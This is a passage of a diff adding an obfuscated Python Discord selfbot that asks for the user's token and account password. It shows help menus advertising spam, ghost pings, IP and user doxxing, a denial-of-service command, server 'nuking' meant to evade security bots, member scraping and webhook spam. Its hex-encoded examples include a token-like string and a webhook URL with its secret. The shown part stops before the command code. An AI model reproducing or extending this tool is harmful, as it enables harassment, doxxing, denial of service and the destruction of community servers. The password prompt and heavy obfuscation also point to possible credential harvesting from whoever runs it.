@@ -1,0 +1,472 @@
+import os #line:1
+import discord #line:2
+from discord .ext import commands #line:3
+import asyncio #line:4
+import random #line:5
+import requests #line:6
+import sys #line:7
+import threading #line:8
+import datetime #line:9
+import json #line:10
+import aiohttp #line:11
+from colorama import Fore #line:12
+import time #line:13
+risinencryption =input("\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54\x20\x7C\x20\x45\x4E\x54\x45\x52\x20\x53\x45\x4C\x46\x20\x54\x4F\x4B\x45\x4E\x3A ")
+risinencryption1 =input("\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54\x20\x7C\x20\x45\x4E\x54\x45\x52\x20\x50\x52\x45\x46\x49\x58\x3A ")#line:19
+risinencryption2 =input("\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54\x20\x7C\x20\x45\x4E\x54\x45\x52\x20\x41\x43\x43\x4F\x55\x4E\x54\x20\x50\x41\x53\x53\x57\x4F\x52\x44\x3A ")#line:20
+print("\n\x41\x74\x74\x65\x6D\x70\x74\x69\x6E\x67\x20\x74\x6F\x20\x6B\x69\x6C\x6C\x20\x44\x69\x73\x63\x6F\x72\x64\x2E\n\x4C\x6F\x67\x67\x69\x6E\x67\x20\x69\x6E\x20\x79\x6F\x75\x72\x20\x61\x63\x63\x6F\x75\x6E\x74\x2E\n\x4D\x61\x64\x65\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x2E")#line:22
+SPYSBOP =commands .Bot (command_prefix =risinencryption1 ,case_insensitive =True ,self_bot =True )#line:24
+SPYSBOP .remove_command (name ="\x68\x65\x6C\x70")#line:25
+@SPYSBOP .event #line:27
+async def on_ready ():#line:28
+    await SPYSBOP .change_presence (activity =discord .Streaming (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54\x20\x4F\x50",url ="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x74\x77\x69\x74\x63\x68\x2E\x74\x76\x2F\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A"))#line:29
+    print('\n\x4C\x6F\x67\x67\x65\x64\x20\x69\x6E\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\n\x54\x79\x70\x65\x20\x41\x6C\x69\x76\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x20\x74\x6F\x20\x43\x68\x65\x63\x6B\n\x4D\x61\x64\x65\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A')#line:30
+@SPYSBOP .command (pass_context =True )#line:33
+async def help (O0O000O0OO0OO00OO ):#line:34
+        O0O00000OOOOOO0O0 =discord .Embed (color =000000 )#line:35
+        O0O00000OOOOOO0O0 .set_author (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54")#line:36
+        O0O00000OOOOOO0O0 .set_thumbnail (url ="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x2E\x69\x6D\x67\x75\x72\x2E\x63\x6F\x6D\x2F\x5A\x55\x62\x5A\x35\x35\x79\x2E\x67\x69\x66")#line:37
+        O0O00000OOOOOO0O0 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:38
+        O0O00000OOOOOO0O0 .add_field (name ="\x3E\x68\x65\x6C\x70",value ="```\x53\x68\x6F\x77\x73\x20\x48\x65\x6C\x70\x20\x43\x6D\x64\x73```")#line:39
+        O0O00000OOOOOO0O0 .add_field (name ="\x3E\x74\x65\x78\x74",value ="```\x53\x68\x6F\x77\x73\x20\x54\x65\x78\x74\x20\x43\x6D\x64\x73```")#line:40
+        O0O00000OOOOOO0O0 .add_field (name ="\x3E\x68\x61\x63\x6B",value ="```\x53\x68\x6F\x77\x73\x20\x68\x61\x63\x6B\x20\x43\x6D\x64\x73```")#line:41
+        O0O00000OOOOOO0O0 .add_field (name ="\x3E\x6E\x75\x6B\x65",value ="```\x53\x68\x6F\x77\x73\x20\x6E\x75\x6B\x65\x20\x43\x6D\x64\x73```")#line:42
+        O0O00000OOOOOO0O0 .add_field (name ="\x3E\x6D\x69\x73\x63",value ="```\x53\x68\x6F\x77\x73\x20\x6D\x69\x73\x63\x20\x43\x6D\x64\x73```")#line:43
+        O0O00000OOOOOO0O0 .add_field (name ="\x3E\x73\x74\x61\x74\x75\x73",value ="```\x73\x68\x6F\x77\x73\x20\x41\x64\x64\x69\x74\x69\x6F\x6E\x61\x6C\x20\x73\x74\x61\x74\x75\x73\x20\x43\x6D\x64\x73```")#line:44
+        await O0O000O0OO0OO00OO .send (embed =O0O00000OOOOOO0O0 )#line:45
+@SPYSBOP .command (pass_context =True )#line:47
+async def text (O0OOO00OOOO0O0O0O ):#line:48
+        OOO000O0O00O0OO00 =discord .Embed (color =000000 )#line:49
+        OOO000O0O00O0OO00 .set_author (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54 | TEXT CMDS")#line:50
+        OOO000O0O00O0OO00 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:51
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x73\x70\x61\x6D",value ="```\x53\x70\x61\x6D\x73\x20\x74\x68\x65\x20\x63\x68\x61\x74 \n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x73\x70\x61\x6D\x20\x3C\x69\x6E\x74\x3E\x20\x3C\x6D\x73\x67\x3E\x20\n\x45\x78\x2D\x20\x3E\x73\x70\x61\x6D\x20\x35\x30\x20\x54\x45\x41\x4D\x20\x53\x50\x59\x20\x4F\x50```")#line:52
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x67\x68\x6F\x73\x74\x70\x69\x6E\x67",value ="```\x44\x65\x6C\x65\x74\x65\x73\x20\x74\x68\x65\x20\x70\x69\x6E\x67\x20\x69\x6E\x73\x74\x61\x6E\x74\x6C\x79\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x67\x68\x6F\x73\x74\x70\x69\x6E\x67\x20\x3C\x6D\x65\x6E\x74\x69\x6F\x6E\x2F\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\n\x45\x78\x2D\x20\x3E\x67\x68\x6F\x73\x74\x70\x69\x6E\x67\x20\x40\\x65\x76\x65\x72\x79\x6F\x6E\x65```")#line:53
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x70\x75\x72\x67\x65",value ="```\x44\x65\x6C\x65\x74\x65\x73\x20\x59\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x73\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x70\x75\x72\x67\x65\x20\x3C\x69\x6E\x74\x3E\n\x45\x78\x2D\x20\x3E\x70\x75\x72\x67\x65\x20\x35\x30```")#line:54
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x61\x66\x6B",value ="```\x54\x75\x72\x6E\x73\x20\x6F\x6E\x20\x6F\x72\x20\x6F\x66\x66\x20\x61\x66\x6B\x20\x73\x79\x73\x74\x65\x6D\x2E\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x61\x66\x6B\x20\x6F\x6E\x2C\x20\x3E\x61\x66\x6B\x20\x6F\x66\x66\n\x45\x78\x2D\x20\x3E\x61\x66\x6B\x20\x6F\x6E\x2C\x20\x3E\x61\x66\x6B\x20\x6F\x66\x66```")#line:55
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x61\x66\x6B\x6D\x73\x67",value ="```\x53\x65\x74\x73\x20\x41\x66\x6B\x20\x4D\x65\x73\x73\x61\x67\x65\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x61\x66\x6B\x6D\x73\x67\x20\x3C\x74\x65\x78\x74\x3E\n\x45\x78\x2D\x20\x3E\x61\x66\x6B\x6D\x73\x67\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x20\x69\x73\x20\x61\x66\x6B\x20\x72\x6E\x2C\x20\x70\x6C\x65\x61\x73\x65\x20\x63\x68\x65\x63\x6B\x20\x62\x61\x63\x6B\x20\x6C\x61\x74\x65\x72```")#line:56
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x65\x6D\x62\x65\x64",value ="```\x53\x65\x6E\x64\x20\x79\x6F\x75\x72\x20\x4D\x65\x73\x73\x61\x67\x65\x20\x69\x6E\x20\x61\x6E\x20\x45\x6D\x62\x65\x64\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x65\x6D\x62\x65\x64\x20\x3C\x74\x65\x78\x74\x3E\n\x45\x78\x2D\x20\x3E\x65\x6D\x62\x65\x64\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x20\x69\x73\x20\x4F\x50```")#line:57
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x6C\x65\x61\x76\x65",value ="```\x4C\x65\x61\x76\x65\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x77\x68\x65\x72\x65\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x20\x69\x73\x20\x75\x73\x65\x64\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x6C\x65\x61\x76\x65\x20\n\x45\x78\x2D\x20\x3E\x6C\x65\x61\x76\x65```")#line:58
+        OOO000O0O00O0OO00 .add_field (name ="\x3E\x66\x69\x72\x73\x74\x6D\x73\x67",value ="```\x53\x68\x6F\x77\x73\x20\x74\x68\x65\x20\x66\x69\x72\x73\x74\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x6F\x66\x20\x74\x68\x65\x20\x63\x68\x61\x74\x20\x77\x69\x74\x68\x20\x61\x20\x6A\x75\x6D\x70\x20\x62\x75\x74\x6F\x6E\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x66\x69\x72\x73\x74\x6D\x73\x67\n\x45\x78\x2D\x20\x3E\x66\x69\x72\x73\x74\x6D\x73\x67```")#line:59
+        OOO000O0O00O0OO00 .add_field (name ="\x45\x78\x2D\x20\x3E\x62\x6C\x6F\x63\x6B",value ="```\x42\x6C\x6F\x63\x6B\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x62\x6C\x6F\x63\x6B\n\x45\x78\x2D\x20\x3E\x62\x6C\x6F\x63\x6B```")#line:60
+        await O0OOO00OOOO0O0O0O .send (embed =OOO000O0O00O0OO00 )#line:62
+@SPYSBOP .command (pass_context =True )#line:64
+async def hack (OOO00O0OOOOOO0000 ):#line:65
+        OOO00000000OOOO0O =discord .Embed (color =000000 )#line:66
+        OOO00000000OOOO0O .set_author (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54 | HACK CMDS")#line:67
+        OOO00000000OOOO0O .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:68
+        OOO00000000OOOO0O .add_field (name ="\x3E\x64\x6F\x78\x69\x70",value ="```\x44\x69\x73\x70\x6C\x61\x79\x73\x20\x69\x6E\x66\x6F\x20\x6F\x6E\x20\x61\x6E\x20\x49\x50\x20\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x69\x70\x20\x3C\x74\x61\x72\x67\x65\x74\x3E\x20\n\x45\x78\x2D\x20\x3E\x69\x70\x20\x31\x36\x32\x2E\x31\x35\x39\x2E\x31\x32\x38\x2E\x32\x33\x33```")#line:69
+        OOO00000000OOOO0O .add_field (name ="\x3E\x64\x6F\x73\x69\x70",value ="```\x50\x65\x72\x66\x6F\x72\x6D\x73\x20\x73\x69\x6D\x70\x6C\x65\x20\x44\x65\x6E\x69\x61\x6C\x20\x6F\x66\x20\x53\x65\x72\x76\x69\x63\x65\x20\x61\x74\x74\x61\x63\x6B\x20\x6F\x6E\x20\x61\x6E\x20\x49\x50\x20\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x64\x6F\x73\x69\x70\x20\x3C\x74\x61\x72\x67\x65\x74\x3E\x20\n\x45\x78\x2D\x20\x3E\x64\x6F\x73\x69\x70\x20\x31\x36\x32\x2E\x31\x35\x39\x2E\x31\x32\x38\x2E\x32\x33\x33```")#line:70
+        OOO00000000OOOO0O .add_field (name ="\x3E\x64\x6F\x78\x75\x73\x65\x72",value ="```\x44\x69\x73\x70\x6C\x61\x79\x73\x20\x69\x6E\x66\x6F\x20\x6F\x6E\x20\x61\x20\x75\x73\x65\x72\x20\x7C\x20\x4F\x6E\x6C\x79\x20\x77\x6F\x72\x6B\x73\x20\x69\x6E\x20\x61\x20\x73\x65\x72\x76\x65\x72\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x64\x6F\x78\x75\x73\x65\x72\x20\x3C\x40\x74\x61\x72\x67\x65\x74\x3E\x20\n\x45\x78\x2D\x20\x3E\x64\x6F\x78\x75\x73\x65\x72\x20\x40\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A```")#line:71
+        OOO00000000OOOO0O .add_field (name ="\x3E\x64\x6F\x78\x74\x6F\x6B\x65\x6E",value ="```\x44\x69\x73\x70\x6C\x61\x79\x73\x20\x69\x6E\x66\x6F\x20\x6F\x6E\x20\x61\x20\x44\x69\x73\x63\x6F\x72\x64\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x74\x64\x6F\x78\x20\x3C\x74\x61\x72\x67\x65\x74\x2D\x74\x6F\x6B\x65\x6E\x3E\x20\n\x45\x78\x2D\x20\x3E\x74\x64\x6F\x78\x20\x6D\x66\x61\x2E\x57\x33\x44\x69\x34\x46\x70\x72\x52\x5A\x5F\x41\x58\x48\x5F\x59\x35\x2D\x41\x39\x52\x65\x6F\x73\x68\x53\x75\x39\x44\x7A\x6E\x5F\x66\x54\x58\x72\x76\x42\x68\x77\x63\x36\x70\x33\x4C\x76\x6B\x59\x4C\x4A\x4D\x34\x6A\x62\x72\x33\x33\x38\x59\x55\x4D\x5A\x37\x45\x43\x6E\x6A\x32\x7A\x62\x78\x6E\x4B\x6D\x2D\x49\x32\x52\x65\x46\x68\x32\x5A\x70```")#line:72
+        OOO00000000OOOO0O .add_field (name ="\x3E\x64\x6F\x78\x73\x65\x72\x76\x65\x72",value ="```\x44\x69\x73\x70\x6C\x61\x79\x73\x20\x69\x6E\x66\x6F\x20\x6F\x6E\x20\x61\x20\x44\x69\x73\x63\x6F\x72\x64\x20\x53\x65\x72\x76\x65\x72\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x64\x6F\x78\x73\x65\x72\x76\x65\x72\n\x45\x78\x2D\x20\x3E\x64\x6F\x78\x73\x65\x72\x76\x65\x72```")#line:73
+        OOO00000000OOOO0O .add_field (name ="\x3E\x70\x69\x6E\x67\x77\x65\x62",value ="```\x50\x69\x6E\x67\x73\x20\x74\x68\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x74\x6F\x20\x63\x68\x65\x63\x6B\x20\x77\x68\x65\x74\x68\x65\x72\x20\x69\x74\x73\x20\x6F\x70\x65\x72\x61\x74\x69\x6F\x6E\x61\x6C\x20\x6F\x72\x20\x6E\x6F\x74\x2E\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x70\x69\x6E\x67\x77\x65\x62\x20\x3C\x77\x65\x62\x73\x69\x74\x65\x20\x75\x72\x6C\x3E\n\x45\x78\x2D\x20\x3E\x70\x69\x6E\x67\x77\x65\x62\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F```")#line:74
+        OOO00000000OOOO0O .add_field (name ="\x3E\x67\x65\x74\x72\x6F\x6C\x65\x73",value ="```\x53\x65\x6E\x64\x73\x20\x61\x6C\x6C\x20\x72\x6F\x6C\x65\x73\x20\x6F\x66\x20\x61\x20\x73\x65\x72\x76\x65\x72\x20\x77\x68\x69\x63\x68\x20\x79\x6F\x75\x20\x64\x6F\x6E\x74\x20\x68\x61\x76\x65\x20\x74\x68\x65\x20\x70\x65\x72\x6D\x20\x74\x6F\x20\x76\x69\x65\x77\x20\x7C\x20\x4E\x6F\x74\x65\x20\x2D\x20\x55\x73\x65\x20\x61\x20\x73\x70\x61\x6D\x20\x63\x68\x61\x6E\x6E\x65\x6C\x2E\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x67\x65\x74\x72\x6F\x6C\x65\x73\n\x45\x78\x2D\x20\x3E\x67\x65\x74\x72\x6F\x6C\x65\x73```")#line:75
+        OOO00000000OOOO0O .add_field (name ="\x3E\x6B\x69\x6C\x6C\x77\x65\x62\x68\x6F\x6F\x6B",value ="```\x44\x65\x6C\x65\x74\x65\x73\x20\x61\x20\x77\x65\x62\x68\x6F\x6F\x6B\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x64\x65\x6C\x77\x65\x62\x68\x6F\x6F\x6B\x20\x3C\x77\x65\x62\x68\x6F\x6F\x6B\x3E\n\x45\x78\x2D\x20\x3E\x64\x65\x6C\x77\x65\x62\x68\x6F\x6F\x6B\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x37\x35\x32\x36\x35\x39\x32\x34\x38\x35\x30\x38\x33\x30\x35\x34\x38\x38\x2F\x4A\x6E\x4D\x71\x2D\x73\x42\x49\x4E\x33\x49\x4D\x67\x44\x70\x7A\x67\x54\x2D\x4B\x6E\x70\x46\x44\x4C\x45\x42\x64\x51\x73\x38\x41\x4F\x39\x73\x44\x2D\x5F\x33\x53\x54\x47\x6B\x5F\x69\x6A\x6D\x79\x71\x65\x4B\x72\x6F\x70\x33\x6B\x59\x53\x56\x36\x6C\x62\x34\x72\x79\x38\x53```")#line:76
+        await OOO00O0OOOOOO0000 .send (embed =OOO00000000OOOO0O )#line:77
+@SPYSBOP .command (pass_context =True )#line:79
+async def nuke (OO0O0O0O0OO0O000O ):#line:80
+        OO000OOOOO000OO0O =discord .Embed (color =000000 )#line:81
+        OO000OOOOO000OO0O .set_author (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54 | NUKE CMDS")#line:82
+        OO000OOOOO000OO0O .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:83
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x74\x72\x61\x73\x68",value ="```\x44\x65\x73\x74\x72\x75\x63\x74\x69\x6F\x6E\x20\x32\x30\x32\x31\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x74\x72\x61\x73\x68\x20\x3C\x54\x61\x72\x67\x65\x74\x2D\x73\x65\x72\x76\x65\x72\x2D\x49\x44\x3E\x20\x7C\x20\x41\x64\x6D\x69\x6E\x20\x50\x65\x72\x6D\x73\x20\x52\x65\x71\x75\x69\x72\x65\x64\n\x45\x78\x2D\x20\x3E\x74\x72\x61\x73\x68\x20\x38\x31\x30\x34\x38\x30\x31\x36\x37\x34\x35\x33\x31\x39\x36\x32\x39\x39```")#line:84
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x73\x65\x63\x75\x72\x69\x74\x79\x6E\x75\x6B\x65",value ="```\x4E\x75\x6B\x65\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x69\x6E\x20\x61\x20\x77\x61\x79\x2C\x20\x73\x65\x63\x75\x72\x69\x74\x79\x20\x62\x6F\x74\x20\x77\x6F\x6E\x74\x20\x70\x75\x6E\x69\x73\x68\x20\x79\x6F\x75\x2E\x20\x7C\x20\x57\x6F\x72\x6B\x73\x20\x69\x66\x20\x61\x6E\x64\x20\x6F\x6E\x6C\x79\x20\x69\x66\x20\x79\x6F\x75\x72\x20\x70\x72\x65\x66\x69\x78\x20\x69\x73\x20\x73\x65\x74\x20\x74\x6F\x20\x3E\n\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x73\x65\x63\x75\x72\x69\x74\x79\x6E\x75\x6B\x65```")#line:85
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x73\x63\x72\x61\x70\x65",value ="```\x53\x63\x72\x61\x70\x65\x20\x6D\x65\x6D\x62\x65\x72\x73\x20\x6C\x69\x73\x74\x20\x66\x72\x6F\x6D\x20\x61\x20\x73\x65\x72\x76\x65\x72\x20\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x73\x63\x72\x61\x70\x65\x20\x3C\x54\x61\x72\x67\x65\x74\x2D\x73\x65\x72\x76\x65\x72\x2D\x49\x44\x3E\x20\x7C\x20\x41\x64\x6D\x69\x6E\x20\x6F\x72\x20\x6D\x61\x6E\x61\x67\x65\x20\x50\x65\x72\x6D\x73\x20\x52\x65\x71\x75\x69\x72\x65\x64\n\x45\x78\x2D\x20\x3E\x73\x63\x72\x61\x70\x65\x20\x38\x31\x30\x34\x38\x30\x31\x36\x37\x34\x35\x33\x31\x39\x36\x32\x39\x39```")#line:86
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x72\x63",value ="```\x52\x65\x6E\x61\x6D\x65\x73\x20\x65\x76\x65\x72\x79\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x74\x6F\x20\x74\x68\x65\x20\x6E\x61\x6D\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x64\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x72\x63\x20\x3C\x6E\x61\x6D\x65\x3E\n\x45\x78\x2D\x20\x3E\x72\x63\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x20\x6F\x70\x20\x62\x6F\x6C\x74\x65```")#line:87
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x72\x72",value ="```\x52\x65\x6E\x61\x6D\x65\x73\x20\x65\x76\x65\x72\x79\x20\x72\x6F\x6C\x65\x20\x74\x6F\x20\x74\x68\x65\x20\x6E\x61\x6D\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x64\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x72\x72\x20\x3C\x6E\x61\x6D\x65\x3E\n\x45\x78\x2D\x20\x3E\x72\x72\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x20\x6F\x70\x20\x62\x6F\x6C\x74\x65```")#line:88
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D",value ="```\x43\x72\x65\x61\x74\x65\x73\x20\x6D\x75\x6C\x74\x69\x70\x6C\x65\x20\x77\x65\x62\x68\x6F\x6F\x6B\x73\x20\x69\x6E\x20\x65\x76\x65\x72\x79\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x61\x6E\x64\x20\x53\x70\x61\x6D\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x77\x69\x74\x68\x20\x77\x65\x62\x68\x6F\x6F\x6B\x20\x69\x6E\x20\x61\x6C\x6C\x20\x63\x68\x61\x6E\x6E\x65\x6C\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D\n\x45\x78\x2D\x20\x3E\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D```")#line:89
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x73\x74\x6F\x70\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D",value ="```\x53\x74\x6F\x70\x73\x20\x74\x68\x65\x20\x6F\x6E\x67\x6F\x69\x6E\x67\x20\x73\x70\x61\x6D\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x73\x74\x6F\x70\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D\n\x45\x78\x2D\x20\x3E\x73\x74\x6F\x70\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D```")#line:90
+        OO000OOOOO000OO0O .add_field (name ="\x3E\x73\x70\x61\x6D\x67\x63\x6E\x61\x6D\x65",value ="```\x53\x70\x61\x6D\x20\x43\x68\x61\x6E\x67\x65\x73\x20\x47\x72\x6F\x75\x70\x20\x63\x68\x61\x74\x20\x6E\x61\x6D\x65\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x73\x70\x61\x6D\x67\x63\x6E\x61\x6D\x65\n\x45\x78\x2D\x20\x3E\x73\x70\x61\x6D\x67\x63\x6E\x61\x6D\x65```")#line:91
+        await OO0O0O0O0OO0O000O .send (embed =OO000OOOOO000OO0O )#line:93
+@SPYSBOP .command (pass_context =True )#line:95
+async def misc (OOO00O0000OO000OO ):#line:96
+        O0OOO00O0OO000000 =discord .Embed (color =000000 )#line:97
+        O0OOO00O0OO000000 .set_author (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54 | MISC CMDS")#line:98
+        O0OOO00O0OO000000 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:99
+        O0OOO00O0OO000000 .add_field (name ="\x3E\x72\x65\x6E\x61\x6D\x65\x73\x65\x72\x76\x65\x72",value ="```\x52\x65\x6E\x61\x6D\x65\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6E\x61\x6D\x65\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x72\x65\x6E\x61\x6D\x65\x73\x65\x72\x76\x65\x72\x20\x3C\x6E\x61\x6D\x65\x3E\n\x45\x78\x2D\x20\x3E\x72\x65\x6E\x61\x6D\x65\x73\x65\x72\x76\x65\x72\x20\x54\x45\x41\x4D\x20\x53\x50\x59\x20\x4F\x50```")#line:100
+        O0OOO00O0OO000000 .add_field (name ="\x3E\x69\x6D\x61\x67\x65",value ="```\x53\x65\x6E\x64\x73\x20\x49\x6D\x61\x67\x65\x20\x69\x6E\x20\x61\x6E\x20\x45\x6D\x62\x65\x64\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x69\x6D\x61\x67\x65\x20\x3C\x6C\x69\x6E\x6B\x3E\n\x45\x78\x2D\x20\x3E\x69\x6D\x61\x67\x65\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x64\x69\x61\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x6E\x65\x74\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x38\x30\x32\x32\x33\x30\x34\x37\x31\x33\x37\x38\x34\x36\x38\x38\x37\x35\x2F\x38\x33\x33\x32\x37\x36\x36\x35\x36\x38\x35\x31\x37\x34\x36\x38\x33\x37\x2F\x53\x63\x72\x65\x65\x6E\x73\x68\x6F\x74\x5F\x32\x30\x32\x31\x30\x34\x31\x38\x2D\x31\x35\x31\x33\x34\x30\x2E\x70\x6E\x67\x3F\x77\x69\x64\x74\x68\x3D\x32\x39\x33\x26\x68\x65\x69\x67\x68\x74\x3D\x35\x38\x36\x20```")#line:101
+        await OOO00O0000OO000OO .send (embed =O0OOO00O0OO000000 )#line:104
+@SPYSBOP .command (pass_context =True )#line:106
+async def status (O00OOOOO0OO00O0O0 ):#line:107
+        O0OO0O0OO0O0O0OO0 =discord .Embed (color =000000 )#line:108
+        O0OO0O0OO0O0O0OO0 .set_author (name ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54 | Additional Status CMDS")#line:109
+        O0OO0O0OO0O0O0OO0 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:110
+        O0OO0O0OO0O0O0OO0 .add_field (name ="\x3E\x70\x6C\x61\x79",value ="```\x43\x68\x61\x6E\x67\x65\x73\x20\x74\x68\x65\x20\x73\x74\x61\x74\x75\x73\x20\x74\x6F\x20\x50\x6C\x61\x79\x69\x6E\x67\n\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x2D\x20\x3E\x70\x6C\x61\x79\x20\x3C\x73\x74\x61\x74\x75\x73\x3E\x20\n\x45\x78\x2D\x20\x3E\x70\x6C\x61\x79\x20\x50\x55\x42\x47\x20\x45\x56\x45\x4E\x20\x41\x46\x54\x45\x52\x20\x42\x41\x4E```")#line:111
